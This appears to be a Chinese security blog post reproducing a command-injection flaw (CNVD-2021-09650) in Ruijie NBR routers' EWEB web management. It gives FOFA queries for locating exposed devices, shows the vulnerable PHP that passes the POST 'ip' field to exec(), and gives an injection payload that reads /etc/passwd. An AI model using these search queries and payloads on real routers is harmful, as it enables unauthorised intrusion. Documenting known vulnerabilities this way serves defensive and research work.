---
title: Ruijie-NBR-router-RCE
tags:
  - vuln
categories:
  - 漏洞复现
copyright: true
abbrlink: 43bd18b
index_img: https://z3.ax1x.com/2021/07/13/WFHmrV.jpg
banner_img: https://z3.ax1x.com/2021/07/13/WFHmrV.jpg
date: 2021-07-12 23:44:55
---


锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650

HW漏洞，锐捷NBR路由器 EWEB网管系统部分接口存在命令注入

验证

fofa  `title="锐捷网络-EWEB网管系统"` 或者 `icon_hash="-692947551"`

登录页面这样子：

![](https://z3.ax1x.com/2021/07/13/WFHRZ8.png)

出现漏洞的文件在 `/guest_auth/guestIsUp.php`

```php
<?php
    //查询用户是否上线了
    $userip = @$_POST['ip'];
    $usermac = @$_POST['mac'];

    if (!$userip || !$usermac) {
        exit;
    }
    /* 判断该用户是否已经放行 */
    $cmd = '/sbin/app_auth_hook.elf -f ' . $userip;
    $res = exec($cmd, $out, $status);
    /* 如果已经上线成功 */
    if (strstr($out[0], "status:1")) {
        echo 'true';
    }
?>
```

可以通过命令拼接的方式构造命令执行，如：`ip=127.0.01 | cat /etc/passwd`

![](https://z3.ax1x.com/2021/07/13/WFHWdS.png)

Reference

http://wiki.peiqi.tech/PeiQi_Wiki/网络设备漏洞/锐捷/锐捷NBR路由器%320EWEB网管系统%20远程命令执行漏洞%20CNVD-2021-09650.html

